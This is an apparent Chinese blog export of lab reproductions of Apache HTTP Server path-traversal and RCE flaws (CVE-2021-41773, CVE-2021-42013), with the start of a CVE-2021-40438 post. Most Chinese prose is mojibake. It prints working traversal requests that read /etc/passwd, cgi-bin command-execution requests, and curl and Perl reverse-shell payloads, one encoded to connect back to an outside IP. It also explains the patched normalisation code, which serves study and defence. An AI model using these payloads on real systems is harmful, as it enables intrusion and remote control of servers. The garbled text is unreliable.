HTTP/1.1 Host: 192.168.26.103:8080 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: https://fofa.so/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Length: 46 echo Content-Type: text/plain; echo; id; uname ![image-20230916172825780](Apache HTTP Server 2.4.50 ä¸­çš„è·¯å¾„éå†å’Œæ–‡ä»¶æ³„éœ²æ¼æ´ (CVE-2021-42013)/image-20230916172825780.png) ![image-20230916172906714](Apache HTTP Server 2.4.50 ä¸­çš„è·¯å¾„éå†å’Œæ–‡ä»¶æ³„éœ²æ¼æ´ (CVE-2021-42013)/image-20230916172906714.png) å†™å…¥åå¼¹shell curl -v --data \"echo;echo '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}'&gt;&gt; /tmp/shell.sh\" 'http://192.168.17.128:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' ![image-20230916175907480](Apache HTTP Server 2.4.50 ä¸­çš„è·¯å¾„éå†å’Œæ–‡ä»¶æ³„éœ²æ¼æ´ (CVE-2021-42013)/image-20230916175907480.png) æ‰§è¡Œåå¼¹shell curl -v --data \"echo;bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}'\" 'http://192.168.17.128:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' ![image-20230916191148783](Apache HTTP Server 2.4.50 ä¸­çš„è·¯å¾„éå†å’Œæ–‡ä»¶æ³„éœ²æ¼æ´ (CVE-2021-42013)/image-20230916191148783.png) ![image-20230916191338640](Apache HTTP Server 2.4.50 ä¸­çš„è·¯å¾„éå†å’Œæ–‡ä»¶æ³„éœ²æ¼æ´ (CVE-2021-42013)/image-20230916191338640.png) è¿™é‡Œåå¼¹ä¹ŸèŠ±äº†å¾ˆå¤§æ—¶é—´ï¼Œä¸€ç›´ä¸æˆåŠŸï¼Œæœäº†å¤šä¸ªæ–‡ç« å‘ç°ï¼Œè¿™é‡Œçš„å®¹å™¨ç¯å¢ƒ/bin/bashæŒ‡å‘çš„dashï¼Œä½†æˆ‘ä»¬ç”¨çš„æ˜¯bashå‘½ä»¤ï¼Œæ•…æ­¤è¡Œä¸é€šï¼Œä½†é‚£ä½ä½¬ç”¨äº†bash -cçš„æ–¹æ³•ï¼ŒæˆåŠŸå†™å…¥å¹¶æ‰§è¡Œã€‚åˆ°è¿™é‡Œè¿˜éœ€æ³¨æ„ï¼Œè‹¥æœä½ ç”¨çš„vpsé‚£ä¹ˆå‚å•†çš„å®‰å…¨ç»„ä»¥åŠå®å¡”çš„å®‰å…¨ç»„éƒ½è¦å¼€å¯ï¼Œå¦åˆ™ä¸èƒ½åå¼¹ï¼ˆæˆ‘æ˜¯å¦‚æ­¤ï¼Œä¸çŸ¥é“å¤§å®¶ï¼‰ã€‚ å½“ç„¶è¿™é‡Œä¹Ÿèƒ½ç”¨perlåå¼¹ï¼Œå› ä¸ºè¯¥å®¹å™¨æœ‰perlç¯å¢ƒ perl -e 'use Socket;$i=\"ip\";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};' 0x04 æ¼æ´ä¿®å¤ 2.4.51ç‰ˆæœ¬ä¸­é‡‡ç”¨äº†ç™½åå•çš„æœºåˆ¶ï¼Œåœ¨ap_normalize_pathä¸­åŠ å¼ºäº†å¯¹urlç¼–ç çš„æ ¡éªŒï¼Œåªå…è®¸æ•°å­—ã€å­—æ¯åŠç‰¹å®šçš„ç¬¦å·ç¼–ç ï¼Œå¦‚æœæ˜¯ç™½åå•ä»¥å¤–çš„urlç¼–ç ï¼Œå°±ç›´æ¥æŠ¥é”™ï¼Œä¸ç»§ç»­æäº† while (path[l] != '\\0') { /* RFC-3986 section 2.3: * For consistency, percent-encoded octets in the ranges of * ALPHA (%41-%5A and %61-%7A), DIGIT (%30-%39), hyphen (%2D), * period (%2E), underscore (%5F), or tilde (%7E) should [...] * be decoded to their corresponding unreserved characters by * URI normalizers. */ //å°±åªå…è®¸ä¸Šé¢æ³¨é‡Šå†™åˆ°çš„å†…å®¹ï¼Œå¦‚æœå­˜åœ¨è¿™ä»¥å¤–çš„å†…å®¹ï¼Œå°±ç›´æ¥æŠ¥é”™ã€‚ if (decode_unreserved &amp;&amp; path[l] == '%') { if (apr_isxdigit(path[l + 1]) &amp;&amp; apr_isxdigit(path[l + 2])) { const char c = x2c(&amp;path[l + 1]); if (TEST_CHAR(c, T_URI_UNRESERVED)) { /* Replace last char and fall through as the current * read position */ l += 2; path[l] = c; } } else { /* Invalid encoding */ ret = 0; } } è¿™é‡ŒçœŸçš„æ˜¯çœ‹ä¸æ‡‚ä½¬å¯¹ä»£ç çš„åˆ†æï¼Œå¤ªéš¾äº†ã€‚ã€‚ã€‚è¿˜æ˜¯å…ˆå¼„æ‡‚åŸç†å§ 0x05 æ£€æµ‹å·¥å…· Apache 2.4.49 (CVE-2021-41773) Apache 2.4.50 (CVE-2021-42013) æ‰¹é‡å¤šçº¿ç¨‹æ£€æµ‹å·¥å…·ï¼š Githubåœ°å€ï¼š https://github.com/inbug-team/CVE-2021-41773_CVE-2021-42013 ![image-20230916192049781](Apache HTTP Server 2.4.50 ä¸­çš„è·¯å¾„éå†å’Œæ–‡ä»¶æ³„éœ²æ¼æ´ (CVE-2021-42013)/image-20230916192049781.png) ![image-20230916192111424](Apache HTTP Server 2.4.50 ä¸­çš„è·¯å¾„éå†å’Œæ–‡ä»¶æ³„éœ²æ¼æ´ (CVE-2021-42013)/image-20230916192111424.png) 0x06 å‚è€ƒæ–‡ç«  CVE-2021-41773 &amp;&amp; CVE-2021-42013 Apache HTTP Serverè·¯å¾„ç©¿è¶Šæ¼æ´ï¼ˆCVE-2021-41773ã€CVE-2021-42013ï¼‰å¤ç° CVE-2021-42013 Apache HTTP Server è·¯å¾„ç©¿è¶Šæ¼æ´ ã€Vulfocusè§£é¢˜å¤ç°ã€‘Apache HTTP Server è·¯å¾„ç©¿è¶Šæ¼æ´ï¼ˆCVE-2021-42013ï¼‰ cve-2021-41773å’Œcve-2021-42013çš„åˆ†æ --å€¼å¾—å‚è€ƒ Apache HTTP Server 2.4.50 è·¯å¾„ç©¿è¶Šæ¼æ´ CVE-2021-42013 apache-CVE-2021-41773[42013]-åå¼¹shell åå¼¹shellçš„æ–¹æ³•æ€»ç»“ Apache 2.4.49 (CVE-2021-41773) ã€ 2.4.50 (CVE-2021-42013) æ£€æµ‹å·¥å…·","tags":["CVE"],"categories":["CVEæ¼æ´"]},{"title":"Apache HTTP Server 2.4.49 è·¯å¾„ç©¿è¶Šæ¼æ´ CVE-2021-41773","path":"/2023/09/16/apache-http-server-2.4.49-lu-jing-chuan-yue-lou-dong/","content":"0x01 æ¼æ´æ¦‚è¿° Apache HTTP Serverï¼ˆç®€ç§° Apacheï¼‰æ˜¯å¼€æºçš„ Web æœåŠ¡å™¨ï¼Œå¯ä»¥åœ¨å¤§å¤šæ•°è®¡ç®—æœºæ“ä½œç³»ç»Ÿä¸­è¿è¡Œï¼Œç”±äºå…¶å¤šå¹³å°å’Œå®‰å…¨æ€§è¢«å¹¿æ³›ä½¿ç”¨ï¼Œæ˜¯æœ€æµè¡Œçš„ Web æœåŠ¡å™¨ç«¯è½¯ä»¶ä¹‹ä¸€ã€‚å®ƒå¿«é€Ÿã€å¯é å¹¶ä¸”å¯é€šè¿‡ç®€å•çš„ API æ‰©å±•ï¼Œå°† Perl/Python ç­‰è§£é‡Šå™¨ç¼–è¯‘åˆ°æœåŠ¡å™¨ä¸­ã€‚ Apache æŠ«éœ²äº†ä¸€ä¸ªåœ¨ Apache HTTP Server 2.4.49 ä¸Šå¼•å…¥çš„æ¼æ´ï¼Œç§°ä¸º CVE-2021-41773ã€‚åŒæ—¶å‘å¸ƒäº†2.4.50æ›´æ–°ï¼Œä¿®å¤äº†è¿™ä¸ªæ¼æ´ã€‚è¯¥æ¼æ´å…è®¸æ”»å‡»è€…ç»•è¿‡è·¯å¾„éå†ä¿æŠ¤ï¼Œä½¿ç”¨ç¼–ç å¹¶è¯»å–ç½‘ç»œæœåŠ¡å™¨æ–‡ä»¶ç³»ç»Ÿä¸Šçš„ä»»æ„æ–‡ä»¶ã€‚è¿è¡Œæ­¤ç‰ˆæœ¬ Apache çš„ Linux å’Œ Windows æœåŠ¡å™¨éƒ½å—åˆ°å½±å“ã€‚æ­¤æ¼æ´æ˜¯åœ¨ 2.4.49 ä¸­å¼•å…¥çš„ï¼Œè¯¥è¡¥ä¸æ—¨åœ¨æé«˜ URL éªŒè¯çš„æ€§èƒ½ã€‚å¯ä»¥é€šè¿‡å¯¹â€œ.â€è¿›è¡Œç¼–ç æ¥ç»•è¿‡æ–°çš„éªŒè¯æ–¹æ³•ã€‚ è¯¥æ¼æ´ä»…å½±å“2.4.49ç‰ˆæœ¬ï¼Œæ­¤å¤–è¿˜éœ€è¦åœ¨é…ç½®æ–‡ä»¶ä¸­å…è®¸è®¿é—®ç©¿è¶Šçš„ç›®å½•ï¼Œå¦‚&lt;Directory /&gt;Require all granted&lt;/Directory&gt;ï¼Œä½¿ç”¨é»˜è®¤é…ç½®çš„Apache HTTP Serverä¸å—å½±å“ã€‚ åœ¨æœåŠ¡å™¨å¼€å¯cgiæˆ–cgidæ¨¡å—çš„æƒ…å†µä¸‹ï¼Œè¯¥æ¼æ´å¯æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ 0x02 æ¼æ´æˆå›  Apache HTTP Server 2.4.49ç‰ˆæœ¬ä½¿ç”¨çš„ap_normalize_pathå‡½æ•°åœ¨å¯¹è·¯å¾„åšè¿‡æ»¤çš„æ—¶å€™æ²¡æœ‰è¿‡æ»¤å¹²å‡€ã€‚ ap_normalize_pathå‡½æ•°å¦‚ä¸‹ /* * Inspired by mod_jk's jk_servlet_normalize(). */ AP_DECLARE(int) ap_normalize_path(char *path, unsigned int flags) { int ret = 1; apr_size_t l = 1, w = 1; if (!IS_SLASH(path[0])) { /* Besides \"OPTIONS *\", a request-target should start with '/' * per RFC 7230 section 5.3, so anything else is invalid. */ if (path[0] == '*' &amp;&amp; path[1] == '\\0') { return 1; } /* However, AP_NORMALIZE_ALLOW_RELATIVE can be used to bypass * this restriction (e.g. for subrequest file lookups). */ if (!(flags &amp; AP_NORMALIZE_ALLOW_RELATIVE) || path[0] == '\\0') { return 0; } l = w = 0; } // éå†è·¯å¾„å­—ç¬¦ä¸²ï¼Œä¸€è¾¹åšurlè§£ç ä¸€è¾¹æ£€æµ‹ '..'ï¼Œå‡ºç°æ¼æ´ã€‚ while (path[l] != '\\0') { /* RFC-3986 section 2.3: * For consistency, percent-encoded octets in the ranges of * ALPHA (%41-%5A and %61-%7A), DIGIT (%30-%39), hyphen (%2D), * period (%2E), underscore (%5F), or tilde (%7E) should [...] * be decoded to their corresponding unreserved characters by * URI normalizers. */ // è¿™ä¸€æ®µæ˜¯åœ¨åšURLè§£ç  // æ£€æµ‹åˆ°å½“å‰ä½ä¸ºâ€˜%â€™ï¼Œæ¥ä¸‹æ¥ä¸¤ä½ä¸ºåå…­è¿›åˆ¶æ•°å­—å°±è¿›å…¥if if ((flags &amp; AP_NORMALIZE_DECODE_UNRESERVED) &amp;&amp; path[l] == '%' &amp;&amp; apr_isxdigit(path[l + 1]) &amp;&amp; apr_isxdigit(path[l + 2])) { const char c = x2c(&amp;path[l + 1]); // å°†urlç¼–ç è½¬æ¢ä¸ºå­—ç¬¦ï¼ˆ16è¿›åˆ¶è½¬charï¼‰ if (apr_isalnum(c) || (c &amp;&amp; strchr(\"-._~\", c))) { /* Replace last char and fall through as the current * read position */ l += 2; path[l] = c; } } if ((flags &amp; AP_NORMALIZE_DROP_PARAMETERS) &amp;&amp; path[l] == ';') { do { l++; } while (!IS_SLASH_OR_NUL(path[l])); continue; } // å¦‚æœpath[0]ä¸æ˜¯æ–œæ ï¼Œä¸”ä¸æ˜¯* æˆ–è€…ç©ºä¸²ï¼Œwå°±ä¼šç½®ä¸º0ã€‚ // å¦‚æœw = 0 æˆ–è€… paht[0]æ˜¯æ–œæ ï¼Œå°±è¿›å…¥å¾ªç¯ã€‚ if (w == 0 || IS_SLASH(path[w - 1])) { /* Collapse ///// sequences to / */ //è·³è¿‡è¿ç»­çš„æ–œæ  if ((flags &amp; AP_NORMALIZE_MERGE_SLASHES) &amp;&amp; IS_SLASH(path[l])) { do { l++; } while (IS_SLASH(path[l])); continue; } //å¦‚æœæ£€æµ‹åˆ°ç‚¹å· if (path[l] == '.') { /* Remove /./ segments */ if (IS_SLASH_OR_NUL(path[l + 1])) { l++; if (path[l]) { l++; } continue; } /* Remove /xx/../ segments */ // å¦‚æœç‚¹å·çš„ä¸‹ä¸€ä¸ªè¿˜æ˜¯ç‚¹å·ï¼Œå°±è¦åˆ ä¸€ç‚¹äº† if (path[l + 1] == '.' &amp;&amp; IS_SLASH_OR_NUL(path[l + 2])) { /* Wind w back to remove the previous segment */ if (w &gt; 1) { do { w--; } while (w &amp;&amp; !IS_SLASH(path[w - 1])); } else { /* Already at root, ignore and return a failure * if asked to. */ if (flags &amp; AP_NORMALIZE_NOT_ABOVE_ROOT) { ret = 0; } } /* Move l forward to the next segment */ l += 2; if (path[l]) { l++; } continue; } } } path[w++] = path[l++]; } path[w] = '\\0'; return ret; } å¯ä»¥çœ‹åˆ°ï¼Œæ¼æ´çš„äº§ç”ŸåŸå› æ˜¯å…¶éå†ä¸€æ•´ä¸ªè·¯å¾„å­—ç¬¦ä¸²ï¼Œå¯¹æ¯ä¸€ä½ï¼Œå…ˆè¿›è¡Œurlè§£ç ï¼Œç„¶åæ£€æµ‹æ˜¯ä¸æ˜¯å½“å‰ä½å’Œä¸‹ä¸€ä½çš„ç»„åˆæ˜¯ä¸æ˜¯ä¸¤ä¸ªç‚¹.. ä»–èƒ½æ£€æµ‹å‡ºçš„æƒ…å†µå¦‚ä¸‹ .. %2e. // æ­£åœ¨å¤„ç†ç¬¬ä¸€ä½ï¼Œè§£ç åå‘ç°æ˜¯..ç»„åˆ ç„¶è€Œå¦‚æœé‡åˆ°è¿™ç§æƒ…å†µ .%2e // è§£ç ç¬¬ä¸€ä½ï¼Œä»ç„¶æ˜¯.%2eï¼Œæ²¡æœ‰æ£€æµ‹åˆ°..ç»„åˆ %2e%2e // è§£ç ç¬¬ä¸€ä½ï¼Œè§£æˆ.%2eï¼Œä»ç„¶æ— æ³•æ£€æµ‹åˆ°..ç»„åˆ 0x03 æ¼æ´å¤ç° å¯åŠ¨åï¼Œè®¿é—®ç¯å¢ƒip 8080ç«¯å£çœ‹åˆ°â€œIt Works!â€è¡¨æ˜ç¯å¢ƒå¯åŠ¨æˆåŠŸ å‘é€ä»¥ä¸‹payloadæˆåŠŸè¯»å–/etc/passwdæ–‡ä»¶ /icons/ç›®å½•æ˜¯ä¸€ä¸ªå­˜åœ¨ä¸”å¯è®¿é—®çš„ç›®å½•ï¼Œæµ‹è¯•æ—¶ä¹Ÿå¯æ”¹ä¸ºå…¶ä»–ç›®å½•å¦‚/cgi-bin/ï¼Œä½†åœ¨æœ¬ç¯å¢ƒä¸­/cgi-bin/ç›®å½•è®¿é—®çŠ¶æ€ç ä¸º403ï¼Œå› æ­¤ä½¿ç”¨äº†/icons/ç›®å½• GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd Host: 192.168.26.103:8080 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ![image-20230916163701796](Apache HTTP Server 2.4.49 è·¯å¾„ç©¿è¶Šæ¼æ´/image-20230916163701796.png) æ‰§è¡Œå‘½ä»¤ POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh Host: 192.168.26.103:8080 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Length: 46 echo Content-Type: text/plain; echo; id; uname ![image-20230916163905857](Apache HTTP Server 2.4.49 è·¯å¾„ç©¿è¶Šæ¼æ´/image-20230916163905857.png) 0x04 æ¼æ´ä¿®å¤ 1ï¼‰41773â€”â€”2.4.50ç‰ˆæœ¬å¯¹ap_normalize_pathå‡½æ•°è¿›è¡Œä¿®æ”¹ï¼Œè¡¥å……äº†å¦‚ä¸‹ä»£ç ï¼Œå¯¹.%2eçš„ç»•è¿‡å½¢å¼è¿›è¡Œäº†åˆ¤æ–­ï¼Œå¯ä»¥é¿å…ä½¿ç”¨è¯¥æ–¹æ³•ç»•è¿‡ã€‚ if ((path[n] == '.' || (decode_unreserved &amp;&amp; path[n] == '%' &amp;&amp; path[++n] == '2' &amp;&amp; (path[++n] == 'e' || path[n] == 'E'))) &amp;&amp; IS_SLASH_OR_NUL(path[n + 1])) { /* Wind w back to remove the previous segment */ if (w &gt; 1) { do { w--; } while (w &amp;&amp; !IS_SLASH(path[w - 1])); } else { /* Already at root, ignore and return a failure * if asked to. */ if (flags &amp; AP_NORMALIZE_NOT_ABOVE_ROOT) { ret = 0; } } /* Move l forward to the next segment */ l = n + 1; if (path[l]) { l++; } continue; }&lt;br&gt;â€”â€”â€”â€”https://xz.aliyun.com/t/10359?page=1 2ï¼‰42013â€”â€”2.4.51ç‰ˆæœ¬é’ˆå¯¹è¯¥æ¼æ´è¿›è¡Œäº†å¤šå¤„ä¿®æ”¹ï¼Œæœ€æ ¸å¿ƒçš„ä¸€å¤„ä¿®æ”¹æ˜¯åœ¨ap_normalize_pathå‡½æ•°ä¸­åŠ å¼ºäº†å¯¹urlç¼–ç çš„æ ¡éªŒï¼Œå¦‚æœæ£€æµ‹åˆ°å­˜åœ¨éæ ‡å‡†urlç¼–ç ï¼ˆ%+ä¸¤ä¸ªåå…­è¿›åˆ¶å­—ç¬¦ï¼‰çš„æƒ…å†µï¼Œå°±è¿”å›ç¼–ç é”™è¯¯ï¼Œä»æ ¹æœ¬ä¸Šæœç»äº†å¤šé‡ç¼–ç å¯èƒ½å¯¼è‡´çš„ç»•è¿‡ï¼Œä¿®å¤ä»£ç å¦‚ä¸‹ï¼š while (path[l] != '\\0') { /* RFC-3986 section 2.3: * For consistency, percent-encoded octets in the ranges of * ALPHA (%41-%5A and %61-%7A), DIGIT (%30-%39), hyphen (%2D), * period (%2E), underscore (%5F), or tilde (%7E) should [...] * be decoded to their corresponding unreserved characters by * URI normalizers. */ if (decode_unreserved &amp;&amp; path[l] == '%') { if (apr_isxdigit(path[l + 1]) &amp;&amp; apr_isxdigit(path[l + 2])) { const char c = x2c(&amp;path[l + 1]); if (TEST_CHAR(c, T_URI_UNRESERVED)) { /* Replace last char and fall through as the current * read position */ l += 2; path[l] = c; } } else { /* Invalid encoding */ ret = 0; } }â€”â€”â€”â€”https://xz.aliyun.com/t/10359?page=1 0x05 POCåˆ©ç”¨ é¡¹ç›®åœ°å€å‚è€ƒï¼š https://github.com/lorddemon/CVE-2021-41773-PoC/ https://github.com/0xAlmighty/CVE-2021-41773-PoC è¿™é‡Œæ¨èç¬¬äºŒä¸ªï¼Œå› ä¸ºæˆ‘ç¬¬ä¸€ä¸ªæ²¡æˆåŠŸ ![image-20230916170222150](Apache HTTP Server 2.4.49 è·¯å¾„ç©¿è¶Šæ¼æ´/image-20230916170222150.png) ![image-20230916170230540](Apache HTTP Server 2.4.49 è·¯å¾„ç©¿è¶Šæ¼æ´/image-20230916170230540.png) ä¸è¿‡åœ¨åˆ©ç”¨ç¬¬äºŒä¸ªçš„æ—¶å€™å¦‚æœåœ¨æ˜ç¡®æœ‰æ¼æ´ä½†ä»æœªåˆ©ç”¨çš„ï¼Œé‚£éœ€è¦å¤§å®¶å»pyä¿®æ”¹ä¸€äº›å†…å®¹ï¼Œæ¯”å¦‚ç«¯å£ï¼Œæˆ–è€…ç©¿è¶Šè·¯å¾„æ—¶çš„%2eçš„æ•°é‡ç­‰ç­‰ 0x06 å‚è€ƒæ–‡ç«  [CVE-2021-41773(42013) Apache HTTP Serverè·¯å¾„ç©¿è¶Šæ¼æ´å¤ç°] CVE-2021-41773 Apache HTTP Serverè·¯å¾„éå†æ¼æ´0day Apache HTTP Serverè·¯å¾„ç©¿è¶Šæ¼æ´ï¼ˆCVE-2021-41773ã€CVE-2021-42013ï¼‰å¤ç° Apahce HTTPd 2.4.49ï¼ˆCVE-2021-41773ï¼‰æ¼æ´å¤ç°è¯¦ç»†æ•™ç¨‹","tags":["CVE"],"categories":["CVEæ¼æ´"]},{"title":"Apache HTTP æœåŠ¡å™¨ 2.4.48 mod_proxy SSRF (CVE-2021-40438)","path":"/2023/09/16/apache-http-fu-wu-qi-2.4.48-mod-proxy-ssrf-cve-2021-40438/","content":"0x01 å‰è¨€ åˆæ˜¯ä¸€ç¯‡æ¼æ´å¤ç°ï¼Œè™½ç„¶æˆ‘è‡³ä»Šå¤ç°äº†è®¸å¤šCVEæ¼æ´ï¼Œä½†å¿ƒä¸­æ€»æ˜¯æ„Ÿè§‰ç¼ºå°‘ç‚¹ä»€ä¹ˆï¼Œå¤ç°çš„æ—¶å€™çœ‹åˆ°é‚£äº›å¤§ä½¬çš„åˆ†ææ–¹æ³•ï¼Œæ­¥éª¤åŠæ€è·¯ï¼Œè®©æˆ‘å¹ä¸ºè§‚æ­¢ï¼ˆè¿™ä»¤æˆ‘äº§ç”Ÿäº†ä¸€ç§â€œé”™è§‰â€ï¼Ÿæ¼æ´å¤ç°æœ¬å°±æ˜¯æ·±å…¥åº•å±‚ä»£ç å»åˆ†ææ¼æ´åŸç†å—ï¼Ÿï¼‰å½“ç„¶å¾ˆæ˜æ˜¾æœ¬å°±åº”è¯¥è¿™æ ·åšï¼Œä½†å¯¹äºæ–°æ‰‹çš„æˆ‘æ¥è¯´ï¼Œè¿™ç§æ–¹æ³•å´ä¼¼ä¹æˆä¸ºäº†ä¸€å µé«˜å¢™ï¼Œæˆ‘åœ¨æƒ³æˆ‘ç©¶ç«Ÿæ˜¯è¦è·Ÿç€å¤§ä½¬å»ä»£ç ä¸–ç•Œèµ°ä¸€é­è¿˜æ˜¯å•çº¯ç†è§£æ¼æ´å¦‚ä½•äº§ç”Ÿï¼Œå½±å“èŒƒå›´ï¼Œå¦‚ä½•åˆ©ç”¨å°±å¥½äº†ã€‚ è™½ç„¶ç›®å‰å¿ƒä¸­è¿˜æ˜¯æ²¡æœ‰æ˜ç¡®ç­”æ¡ˆï¼Œä½†æˆ‘ä¼¼ä¹åº”è¯¥æ¸…é†’ä¸€äº›ï¼Œé‚£äº›ä½¬ä¸€å®šæœ‰ç€æ·±åšçš„åŠŸåº•ï¼Œå› æ­¤è¿™äº›å¤ç°çš„æŠ€æœ¯æ–¹æ³•æœ¬å°±æ˜¯ä»–ä»¬çš„åŸºæ“ï¼Œè€Œå¯¹äºç›®å‰æ–°æ‰‹çš„æˆ‘æ¥è¯´ï¼Œé¢å¯¹å¦‚æ­¤åºå¤§çš„ä»£ç é‡ï¼Œä¸”èœé¸¡çš„æˆ‘ç›®å‰ä¸ºæ­¢ï¼Œå¯¹äºä¸€äº›ç®€å•çš„ä»£ç ç¨‹åºçš„æ™®é€šè°ƒè¯•ï¼Œä¹Ÿæ²¡æœ‰ç†Ÿç»ƒç”šè‡³å¾ˆèœã€‚å› æ­¤æˆ‘è®¤ä¸ºæˆ‘è¿™æˆ–è®¸æ½œç§»é»˜åŒ–ä¸­å½¢æˆäº†â€“çœ¼é«˜æ‰‹ä½â€“çš„å¿ƒç†å—ï¼Ÿ ä½†ä¸è®ºå¦‚ä½•è¯´ï¼Œä»€ä¹ˆèƒ½åŠ›åŠä»€ä¹ˆäº‹ï¼Œå› æ­¤æˆ‘ç›®å‰ä¸ºæ­¢å¯¹äºæ­¤ç§æ¼æ´çš„æ€åº¦ä¸ºï¼Œå°½è‡ªå·±æœ€å¤§èƒ½åŠ›ææ¸…æ¥šåŸç†ï¼Œè·Ÿç€å¤§ä½¬çš„æ€è·¯èµ°ä¸Šä¸€é­ï¼Œå“ªæ€•è®°ä¸ä½ï¼Œä½†æˆ–è®¸å¯¹è‡ªå·±ä»£ç å®¡è®¡èƒ½åŠ›ä¹Ÿèƒ½æé«˜ä¸€äº›ï¼Œæ•…æ­¤æ²¡å¿…è¦ç„¦è™‘ï¼Œåªå¸Œæœ›è‡ªå·±åœ¨æ—¥åæœ‰èƒ½åŠ›ä¹‹åï¼Œå¯ä»¥è“¦ç„¶å›é¦–ï¼Œé¨æ¸¸äºä»£ç ä¸–ç•Œã€‚ ä¸Šè¿°ä¹Ÿæ˜¯å‘è¡¨äº†ä¸€ä¸‹å¿ƒä¸­çš„å°å°æ„Ÿæ…¨ï¼Œä½†è¿˜æ˜¯ä¸å¤Ÿå½»åº•ï¼Œä¸è¿‡æƒ³èµ·ä¸€å¥è¯ï¼Œåœ¨è‡ªå·±ç›®å‰è®¤ä¸ºä»€ä¹ˆä¹Ÿæƒ³å¹²ä½†å´ä¸çŸ¥å¹²ä»€ä¹ˆï¼Œæˆ–è€…ç”šè‡³ä»€ä¹ˆä¹Ÿä¸æƒ³åšï¼Œé‚£ä¹Ÿè¦åœ¨è‡ªå·±çƒ­çˆ±çš„æ–¹é¢ä¸€ç›´å­¦ä¸‹å»ï¼Œæˆ–è®¸å“ªä¸€ç¯‡æ–‡ç« ï¼Œå“ªä¸€å¥è¯ï¼Œå“ªä¸€ä¸ªäººï¼Œå°±ç»™äº†ä½ å¥‡æ€å¦™æƒ³çš„æ€è·¯ã€‚ã€‚ã€‚ã€‚ä¸å¤šè¯´äº†ï¼Œå¼€å§‹å­¦ä¹ ã€‚ 0x02 å‰ç½®çŸ¥è¯† è¿™é‡Œå‘¢å°±è·Ÿç€ä½¬çš„æ€è·¯èµ°ä¸€éï¼Œè¿‡ç‚¹è„‘å­å³å¯ã€‚ Apache Moduleç»¼è¿° å¦‚æœæˆ‘ä»¬è¦éƒ¨ç½²ä¸€ä¸ªPHPè¿è¡Œç¯å¢ƒï¼Œä¸”å°†Apacheä½œä¸ºWebåº”ç”¨æœåŠ¡å™¨ï¼Œé‚£ä¹ˆå¸¸ç”¨çš„æœ‰ä¸‰ç§æ–¹æ³•ï¼š Apacheä»¥CGIçš„å½¢å¼è¿è¡ŒPHPè„šæœ¬ PHPä»¥mod_phpçš„æ–¹å¼ä½œä¸ºApacheçš„ä¸€ä¸ªæ¨¡å—è¿è¡Œ PHPä»¥FPMçš„æ–¹å¼è¿è¡Œä¸ºç‹¬ç«‹æœåŠ¡ï¼ŒApacheä½¿ç”¨mod_proxy_fcgiæ¨¡å—ä½œä¸ºåä»£æœåŠ¡å™¨å°†è¯·æ±‚ä»£ç†ç»™PHP-FPM ç¬¬ä¸€ç§æ–¹å¼æ¯”è¾ƒå¤è€ï¼Œæ€§èƒ½è¾ƒå·®ï¼ŒåŸºæœ¬å·²ç»æ·˜æ±°ï¼›ç¬¬äºŒç§æ–¹å¼åœ¨Apacheç¯å¢ƒä¸‹ä½¿ç”¨è¾ƒå¹¿ï¼Œé…ç½®æœ€ä¸ºç®€å•ï¼›ç¬¬ä¸‰ç§æ–¹æ³•ä¹Ÿæœ‰è¾ƒå¤§ç”¨æˆ·ä½“é‡ï¼Œä¸è¿‡Apacheä»…ä½œä¸ºä¸€ä¸ªä¸­é—´çš„åä»£æœåŠ¡å™¨ï¼Œæ›´å¤šæ–°çš„ç”¨æˆ·ä¼šé€‰æ‹©ä½¿ç”¨æ€§èƒ½æ›´å¥½çš„Nginxæ›¿ä»£ã€‚ è¿™å…¶ä¸­ï¼Œç¬¬ä¸‰ç§æ–¹æ³•ä½¿ç”¨çš„mod_proxy_fcgiå°±æ˜¯æœ¬æ–‡ä¸»è§’mod_proxyæ¨¡å—çš„ä¸€ä¸ªå­æ¨¡å—ã€‚mod_proxyæ˜¯ApacheæœåŠ¡å™¨ä¸­ç”¨äºåä»£åç«¯æœåŠ¡çš„ä¸€ä¸ªæ¨¡å—ï¼Œè€Œå®ƒæ‹¥æœ‰æ•°ä¸ªä¸åŒåŠŸèƒ½çš„å­æ¨¡å—ï¼Œåˆ†åˆ«ç”¨äºæ”¯æŒä¸åŒé€šä¿¡åè®®çš„åç«¯ï¼Œæ¯”å¦‚å¸¸è§çš„æœ‰ï¼š 